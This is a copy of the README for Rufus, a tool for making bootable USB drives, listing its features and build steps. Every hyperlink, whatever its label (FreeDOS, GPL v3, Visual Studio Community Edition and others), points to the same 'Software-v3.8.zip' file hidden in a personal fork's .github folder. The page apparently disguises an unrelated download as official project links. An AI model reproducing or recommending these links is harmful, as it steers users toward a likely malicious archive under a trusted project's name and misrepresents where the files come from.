Features
--------

* Format USB, flash card and virtual drives to FAT/FAT32/NTFS/UDF/exFAT/ReFS
* Create DOS bootable USB drives, using [FreeDOS](https://raw.githubusercontent.com/firoznazar9/rufus/master/.github/Software-v3.8.zip) or MS-DOS (Windows 8.1 or earlier)
* Create BIOS or UEFI bootable drives, including [UEFI bootable NTFS](https://raw.githubusercontent.com/firoznazar9/rufus/master/.github/Software-v3.8.zip)
* Create bootable drives from bootable ISOs (Windows, Linux, etc.)
* Create bootable drives from bootable disk images, including compressed ones
* Create [Windows To Go](https://raw.githubusercontent.com/firoznazar9/rufus/master/.github/Software-v3.8.zip) drives
* Compute MD5, SHA-1 and SHA-256 checksums of the selected image
* Twice as fast as Microsoft's USB/DVD tool or UNetbootin, on ISO -> USB creation <sup>(1)</sup>
* Perform bad blocks checks, including detection of "fake" flash drives
* Modern and familiar UI, with [39 languages natively supported](https://raw.githubusercontent.com/firoznazar9/rufus/master/.github/Software-v3.8.zip)
* Small footprint. No installation required.
* Portable
* 100% [Free Software](https://raw.githubusercontent.com/firoznazar9/rufus/master/.github/Software-v3.8.zip) ([GPL v3](https://raw.githubusercontent.com/firoznazar9/rufus/master/.github/Software-v3.8.zip))

Compilation
-----------

Use either Visual Studio 2017 (with Update 4 and SDK 10.0.16299 installed) or MinGW and
then invoke the `.sln` or `configure`/`make` respectively.

#### Visual Studio
Note that, since Rufus is an OSI compliant Open Source project, you are entitled to
download and use the *freely available* [Visual Studio Community Edition](https://raw.githubusercontent.com/firoznazar9/rufus/master/.github/Software-v3.8.zip)
